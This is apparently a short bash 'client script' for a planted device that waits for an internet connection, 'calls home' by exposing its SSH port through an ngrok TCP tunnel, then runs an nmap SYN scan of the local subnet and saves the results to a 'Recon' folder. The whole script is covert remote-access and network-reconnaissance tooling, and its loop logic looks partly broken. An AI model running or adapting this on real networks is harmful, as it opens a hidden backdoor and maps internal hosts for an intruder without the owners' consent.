#!/bin/bash
#********Client Script********
#Checks for internet connection before proceeding
while $LOOP :
do	
	sleep 20
	if ping -c1 8.8.8.8  | grep "64" > /dev/null
	then
		echo Internet Status: OK
		echo Now Calling Home...
		#Connect to client script through ngrok
		#assign ngrok to ssh port 22
		ngrok tcp 22
		#Find subnet mask and run an nmap scan
		MASK=`ip -o -f inet addr show eth0 | awk '/scope global/ {print $4}'`
		SUBNET=`netmask -c $MASK`
		echo "*******************************"
		echo "*        Starting Scan        *"
		echo "*******************************"
		nmap -sS $SUBNET > ~/Recon/nmap.txt
		echo "*******************************"
		echo "*       Scan Complete :)      *"
		echo "*******************************"
		LOOP=false
	else
	echo Internet Status: Down
	fi
done
